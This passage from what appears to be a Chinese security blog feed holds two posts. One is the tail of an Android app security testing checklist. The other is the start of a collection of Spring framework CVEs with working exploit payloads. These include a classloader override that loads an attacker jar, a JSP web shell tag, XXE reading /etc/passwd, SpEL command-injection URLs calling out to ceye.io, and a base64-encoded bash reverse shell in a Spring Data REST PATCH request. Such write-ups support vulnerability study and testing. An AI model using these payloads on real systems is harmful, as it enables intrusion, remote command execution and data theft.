    <content type="html"><![CDATA[<h2 id="测试说明"><a href="#测试说明" class="headerlink" title="测试说明"></a>测试说明</h2><p>测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。</p><h2 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h2><h3 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h3><pre><code>jarsigner.exe -verify WhyShouldIPay.apk -verbose -certs</code></pre><p>输出结果为“jar 已验证”时，表示签名正常。  </p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162840.png" alt="image-20200410140458826"></p><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p>此处使用jadx打开APK，若软件使用混淆好加壳则不存在问题。如下打开后是下面这种，则是没添加保护。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162841.png" alt="image-20200410140922318"></p><h3 id="应用完整性检测"><a href="#应用完整性检测" class="headerlink" title="应用完整性检测"></a>应用完整性检测</h3><p>反编译APK，修改其中的res资源文件，把其中的一个图片替换为其他图片</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162843.png" alt="image-20200410141438100"></p><p>如果完整性是检查MANIFEST.MF 中的数据则存在风险。若回编译后安装使用正常，则代表无检查。</p><h3 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h3><p>主要查看是否存在<code>android:exported=&quot;true&quot;</code>属性的组件，存在属性的组件可以被第三方导出。但是部分组件需要被调用来执行，比如组件中存在<code>&lt;intent-filter&gt;</code>过滤器。这种组件就相当于允许导出。</p><p>根据不同的要求这种情况不一定算是风险项。比如此activity组件，由于是首启动页。需要被调用执行，也就不存在上面所说的不允许被导出情况。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162846.png" alt="image-20200410144025704"></p><h3 id="webview组件安全"><a href="#webview组件安全" class="headerlink" title="webview组件安全"></a>webview组件安全</h3><p>Android 4.2 版本以下的 webview 组件存在安全漏洞 ，检测本地是否会被利用的方式是允许运行的sdk最小不能低于17，来避免在受影响的手机上使用。</p><p><img src="APP应用安全检测.assets/image-20200410144355967.png" alt="image-20200410144355967"></p><h2 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h2><h3 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h3><p>查看安装app目录文件权限是否为<code>rw-rw----</code>当前用户可读性模式。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162847.png" alt="image-20200410145303695"></p><p>如果文件目录下存在database目录，db类型的文件，说明使用本地数据库，查看数据文件是否有明文敏感信息。</p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>查看日志文件中是否输出了一些敏感信息，比如账号密码，认证session等</p><p>可以通过adb命令查看，也可以使用第三方连接软件查看<code>adb logcat</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162849.png" alt="image-20200410145927703"></p><h2 id="密码键盘安全性"><a href="#密码键盘安全性" class="headerlink" title="密码键盘安全性"></a>密码键盘安全性</h2><h3 id="屏幕录像"><a href="#屏幕录像" class="headerlink" title="屏幕录像"></a>屏幕录像</h3><p>这种问题从测过的软件和客户来看，在意的程度不高，可能也就在银行金融类APP上会比较在意。</p><p>比如利用adb截图来测试是否可以对屏幕进行记录<code>adb shell /system/bin/screencap -p /path/a.png</code></p><p>如果打开后，可以看到输入的数据，或者可以看到键盘点击反馈则算安全问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162850.png" alt="image-20200410151346239"></p><h3 id="随机键盘"><a href="#随机键盘" class="headerlink" title="随机键盘"></a>随机键盘</h3><p>这种目前只在银行APP支付的时候输入银行卡密码的时候存在，一般APP并没有此要求。可以根据情况来确定是否需要检测此项。</p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><p>APP登陆的密码一般要求大小写字母和数字，需要其中两种以上，不少于八位。如果允许使用纯数字或者纯字母，且长度没有要求的情况下，则存在问题。</p><h3 id="账号登陆限制"><a href="#账号登陆限制" class="headerlink" title="账号登陆限制"></a>账号登陆限制</h3><p>根据业务需要，是否允许同一个账号多设备登陆同时操作，如果不允许则尝试多设备登陆，登陆正常使用则存在问题。</p><h3 id="账号锁定机制"><a href="#账号锁定机制" class="headerlink" title="账号锁定机制"></a>账号锁定机制</h3><p>账号可能存在被爆破密码的可能，在有些不适合使用验证码的场景下，对账号执行登陆错误次数的限制是可以有效防止账号被暴力破解的方式之一。</p><h3 id="验证码安全性"><a href="#验证码安全性" class="headerlink" title="验证码安全性"></a>验证码安全性</h3><p>查看使用的验证码是否能被简单识别，使用能正常使用和防止登陆中被多次验证的问题</p><h3 id="安全退出"><a href="#安全退出" class="headerlink" title="安全退出"></a>安全退出</h3><p>账号在登陆退出后，查看是否正确的注销session。利用原session是否还可以请求到数据。</p><h3 id="密码修改验证"><a href="#密码修改验证" class="headerlink" title="密码修改验证"></a>密码修改验证</h3><p>验证修改密码的功能是否存在问题，是否需要原密码判断，修改的复杂度等是否符合要求</p><h3 id="activity-界面劫持"><a href="#activity-界面劫持" class="headerlink" title="activity 界面劫持"></a>activity 界面劫持</h3><p>如果攻击者注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；在这个service中启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，而正常应用的界面则隐藏在钓鱼界面的后面。</p><p>比如使用<a href="https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。" target="_blank" rel="noopener">https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。</a></p><h2 id="进程防护"><a href="#进程防护" class="headerlink" title="进程防护"></a>进程防护</h2><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><p>可以利用成熟的HOOK框架来尝试，比如使用xpose，在对于进程文件中，查看maps文件。其中可以看到对于的xpose文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162854.png" alt="image-20200410155352701"></p><p>或者使用Frida来加载其中的所有的类，查看是否正常获取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162856.png" alt="image-20200410161814489"></p><h2 id="通信安全"><a href="#通信安全" class="headerlink" title="通信安全"></a>通信安全</h2><h3 id="通信加密"><a href="#通信加密" class="headerlink" title="通信加密"></a>通信加密</h3><p>这种更像是web漏洞，主要查看是否使用了https加密流量，并且是否有正确的证书配置。加密算法是否在TLSv1.1以上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;测试说明&quot;&gt;&lt;a href=&quot;#测试说明&quot; class=&quot;headerlink&quot; title=&quot;测试说明&quot;&gt;&lt;/a&gt;测试说明&lt;/h2&gt;&lt;p&gt;测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。&lt;/p&gt;
&lt;h2 id=&quot;客户端安全&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Spring 框架漏洞集合</title>
    <link href="/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>/2020/04/Spring-框架漏洞集合/</id>
    <published>2020-04-01T05:18:10.000Z</published>
    <updated>2020-04-01T05:18:10.516Z</updated>
    
    <content type="html"><![CDATA[<p>虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。</p><h3 id="CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h3><p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p><p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p><pre><code>示例：POST /adduser HTTP/1.0...firstName = Tavis&amp;lastName = Ormandy如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&#39; class &#39;属性及其后的所有内容均可用于HTTP请求中的设置。攻击如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：POST /adduser HTTP/1.0...class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!她将 使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader</code></pre><p>如何构造这个jar，需要包含以下信息：</p><pre><code>- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类- META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）</code></pre><p>/META-INF/spring-form.tld文件：</p><pre><code>&lt;!-- &lt;form:input/&gt; tag --&gt;    &lt;tag-file&gt;    &lt;name&gt;input&lt;/name&gt;    &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;  &lt;/tag-file&gt;</code></pre><p>/META-INF/tags/InputTag.tag</p><pre><code>&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;&lt;% j java.lang.Runtime.getRuntime().exec(&quot;mkdir /tmp/PWNED&quot;); %&gt;</code></pre><p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p><pre><code>&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot;%&gt;  &lt;form:form commandName=&quot;user&quot;&gt;&lt;form:input path=&quot;name&quot;/&gt;&lt;/form:form&gt;</code></pre><p>攻击者访问url,即可触发远程代码执行的效果:</p><pre><code>http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/</code></pre><p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p><p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p><pre><code>&lt;tag&gt;        &lt;name&gt;inputkxlzx&lt;/name&gt;  //什么名字都行</code></pre><p>在文件中新加入一个tag，叫做input：</p><pre><code>&lt;tag-file&gt;    &lt;name&gt;input&lt;/name&gt;    &lt;path&gt;/WEB-INF/tags/InputTag.tag&lt;/path&gt;  &lt;/tag-file&gt;</code></pre><p>InputTag.tag的内容：</p><pre><code>&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!=null)     exec(request.getParameter(&quot;kxlzxcmd&quot;)); %&gt;&lt;form:inputkxlzx path=&quot;${dynattrs.path}&quot;&gt;&lt;/form:inputkxlzx&gt;</code></pre><p>访问的时候需要在参数中携带kxlzxcmd</p><pre><code>/test.htm?name=kxlzx&amp;kxlzxcmd=calc   //包含input的页面</code></pre><p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html" target="_blank" rel="noopener">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p><p><a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">https://www.inbreak.net/archives/377</a></p><h3 id="CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h3><p>影响版本：3.0.0至3.2.3、4.0.0.M1</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   &lt;username&gt;John&lt;/username&gt;&lt;/xml&gt;</code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   &lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;/xml&gt;</code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="CVE-2013-7315 Spring Framework中的XML外部实体"></a>CVE-2013-7315 Spring Framework中的XML外部实体</h3><p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p><p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   &lt;username&gt;John&lt;/username&gt;&lt;/xml&gt;</code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   &lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;/xml&gt;</code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="CVE-2014-3527 Spring Security验证绕过漏洞"></a>CVE-2014-3527 Spring Security验证绕过漏洞</h3><p>影响版本：</p><pre><code>SpringSource Spring Security 3.1-3.2.4</code></pre><pre><code>当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。</code></pre><h3 id="CVE-2014-0097-Spring-Security认证绕过"><a href="#CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="CVE-2014-0097 Spring Security认证绕过"></a>CVE-2014-0097 Spring Security认证绕过</h3><p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p><pre><code>ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。</code></pre><h3 id="CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>CVE-2014-3578 Spring Framework 目录遍历漏洞</h3><p>影响版本：</p><pre><code>Spring Framework:- 3.0.4 to 3.2.11- 4.0.0 to 4.0.7- 4.1.0 to 4.1.1</code></pre><p>在web.xml存在如下情况下存在目录遍历：</p><pre><code>&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;file:webapps/springapp/WEB-INF/classes/theme/css/&quot; /&gt;</code></pre><p>访问：</p><pre><code>GET /springapp/css/file:/etc/passwd</code></pre><h3 id="CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="CVE-2016-2173 Spring AMQP中的远程代码执行"></a>CVE-2016-2173 Spring AMQP中的远程代码执行</h3><p>影响版本：1.0.0至1.5.4</p><p><a href="https://github.com/HaToan/CVE-2016-2173" target="_blank" rel="noopener">https://github.com/HaToan/CVE-2016-2173</a></p><p>使用方式：</p><pre><code>- ysoserial-0.0.4-all.jar create payload write and execute a shell    + java -jar ysoserial-0.0.4-all.jar &#39;library_vul&#39; &#39;command&#39;- exploit-cve2016-2173.jar : send to App vul    + java -jar exploit-cve2016-2173.jar </code></pre><p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p><h3 id="CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h3><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p><p><a href="https://www.seebug.org/vuldb/ssvid-92474" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92474</a></p><p>漏洞利用POC：</p><pre><code>http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${2334-1}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131645.png" alt="image-20200331090423266"></p><p>执行命令：</p><pre><code>http://207.246.79.196:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131647.png" alt="image-20200331092210362"></p><p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p><p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的  值时会进行一次转义，利用如下脚本加工。</p><pre><code>#coding:utf-8message = input(&#39;Enter message to encode:&#39;)print(&#39;Decoded string (in ASCII):\n&#39;)print(&#39;T(java.lang.Character).toString(%s)&#39; % ord(message[0]), end=&quot;&quot;)for ch in message[1:]:   print(&#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch), end=&quot;&quot;), print(&#39;\n&#39;)print(&#39;new java.lang.String(new byte[]{&#39;, end=&quot;&quot;),print(ord(message[0]), end=&quot;&quot;)for ch in message[1:]:   print(&#39;,%s&#39; % ord(ch), end=&quot;&quot;), print(&#39;)}&#39;)</code></pre><p>执行输出后再添加：</p><pre><code>T(java.lang.Runtime).getRuntime().exec(payload)</code></pre><h3 id="CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h3><p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p><p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html</a></p><p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p><p>POC：</p><pre><code>/?payload=${new%20java.lang.String(new%20byte[]{70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66})}结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)</code></pre><h3 id="CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="CVE-2016-6652 Spring Data JPA SQL盲注"></a>CVE-2016-6652 Spring Data JPA SQL盲注</h3><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p><p><a href="https://www.seebug.org/vuldb/ssvid-92534" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92534</a></p><h3 id="CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h3><p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p><p>使用vulhub搭建环境后，在添加poc执行</p><pre><code>&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()=vulhub</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131651.png" alt="image-20200331111056698"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131653.png" alt="image-20200331111146008"></p><p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p><pre><code>&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131655.png" alt="image-20200331111225481"></p><h3 id="CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="CVE-2017-8045 Spring Amqp中的远程代码执行"></a>CVE-2017-8045 Spring Amqp中的远程代码执行</h3><p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p><p><a href="https://xz.aliyun.com/t/36" target="_blank" rel="noopener">https://xz.aliyun.com/t/36</a></p><h3 id="CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h3><p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p><p><a href="https://www.cnblogs.com/co10rway/p/9380441.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/9380441.html</a></p><p>利用POC执行：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;ping xxx.ceye.io&#39;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]</code></pre><p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a>：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&#39;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131657.png" alt="image-20200331114458798"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131700.png" alt="image-20200331115328723"></p><h3 id="CVE-2018-1258-Spring-Security未经授权的访问"><a href="#CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="CVE-2018-1258 Spring Security未经授权的访问"></a>CVE-2018-1258 Spring Security未经授权的访问</h3><p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p><p>暂无详细信息</p><h3 id="CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>CVE-2018-1259 具有XMLBeam的Spring DataXXE</h3><p>影响版本：</p><pre><code>XMLBeam 1.4.14或更早版本结合使用的Spring Data CommonsSpring Data Commons 1.13至1.13.11（Ingalls SR11）Spring Data REST 2.6至2.6.11（Ingalls SR11）Spring Data Commons 2.0至2.0.6（Kay SR6）Spring Data REST 3.0至3.0.6（Kay SR6）</code></pre><p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p><p><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">https://xz.aliyun.com/t/2341</a></p><h3 id="CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>CVE-2018-1270 Spring Messaging远程代码执行漏洞</h3><p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p><p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p><pre><code>ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131702.png" alt="image-20200331163229079"></p><p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131704.png" alt="image-20200331170304494"></p><p>在发送任意消息，即可触发</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131707.png" alt="image-20200331170357879"></p><p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">poc</a></p><h3 id="CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>CVE-2018-1271 Spring MVC 目录穿越漏洞</h3><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p><p>此漏洞触发条件较高：</p><ol><li>Server运行于Windows系统上</li><li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li><li>没有使用CVE-2018-1199漏洞的补丁</li><li>不使用Tomcat或者是WildFly做Server</li></ol><p>漏洞利用和复现: </p><p><a href="https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p><h3 id="CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h3><p>影响版本：</p><pre><code>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)Spring Data Commons 2.0 to 2.0.5 (Kay SR5)Spring Data REST 3.0 - 3.0.5 (Kay SR5)</code></pre><p><a href="https://www.cnblogs.com/hac425/p/9656747.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9656747.html</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131709.png" alt="image-20200331171801189"></p><p>POC：</p><pre><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]=test</code></pre><h3 id="CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>CVE-2018-1260 Spring Security Oauth2 远程代码执行</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14</code></pre><p><a href="https://www.seebug.org/vuldb/ssvid-97287" target="_blank" 